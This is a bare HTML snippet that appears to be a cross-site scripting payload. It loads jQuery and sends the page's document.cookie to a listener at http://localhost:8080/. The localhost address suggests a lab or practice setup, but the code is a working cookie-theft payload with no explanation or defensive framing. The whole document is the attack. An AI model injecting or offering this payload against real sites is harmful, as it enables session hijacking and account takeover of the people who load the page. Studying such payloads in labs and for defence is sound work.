<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
    $.post("http://localhost:8080/", {
        cookies: document.cookie
    },function() {});
</script>